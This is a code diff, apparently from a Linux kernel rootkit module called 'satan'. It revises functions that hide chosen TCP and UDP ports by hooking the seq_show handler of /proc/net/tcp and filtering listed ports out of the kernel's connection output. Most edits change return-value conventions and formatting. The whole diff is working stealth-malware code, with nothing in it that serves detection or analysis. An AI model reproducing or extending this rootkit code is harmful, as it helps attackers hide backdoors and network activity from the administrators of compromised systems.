@@ -36,7 +36,7 @@ static int satan_seq_show(struct seq_file *seq, void *v);
 
 int satan_port_init(void)
 {
-        return satan_port_hook_seq_show();
+        return satan_port_hook_seq_show() == 0;
 }
 
 void satan_port_exit(void)
@@ -49,26 +49,26 @@ void satan_port_exit(void)
 
 int satan_port_hide(unsigned int port_num)
 {
-        return satan_port_tcp_hide(port_num) &&
-               satan_port_udp_hide(port_num);
+        return satan_port_tcp_hide(port_num) == 0 &&
+               satan_port_udp_hide(port_num) == 0;
 }
 
 int satan_port_unhide(unsigned int port_num)
 {
-        return satan_port_tcp_unhide(port_num) &&
-               satan_port_udp_unhide(port_num);
+        return satan_port_tcp_unhide(port_num) == 0 &&
+               satan_port_udp_unhide(port_num) == 0;
 }
 
 
 
 int satan_port_tcp_hide(unsigned int port_num)
 {
-        return hidden_ports_list_add(port_num);
+        return hidden_ports_list_add(port_num) == 0;
 }
 
 int satan_port_tcp_unhide(unsigned int port_num)
 {
-        return hidden_ports_list_del(port_num);
+        return hidden_ports_list_del(port_num) == 0;
 }
 
 int satan_port_udp_hide(unsigned int port_num)
@@ -160,6 +160,7 @@ static int satan_port_hook_seq_show(void)
         struct file *filp = NULL;
         struct tcp_seq_afinfo *afinfo = NULL;
 
+
         filp = filp_open("/proc/net/tcp", O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
@@ -185,6 +186,7 @@ static int satan_port_unhook_seq_show(void)
         struct file *filp = NULL;
         struct tcp_seq_afinfo *afinfo = NULL;
 
+
         filp = filp_open("/proc/net/tcp", O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
@@ -208,10 +210,12 @@ out:
 static int satan_seq_show(struct seq_file *seq, void *v)
 {
         // Uninitialized for the sake of performance.
+        int ret;
         struct hidden_port *p;
         struct list_head *ptr;
-        int ret = real_seq_show(seq, v);
-       
+        
+
+        ret = real_seq_show(seq, v);
 
         list_for_each(ptr, &hidden_ports_list) {
                 p = list_entry(ptr, struct hidden_port, list);
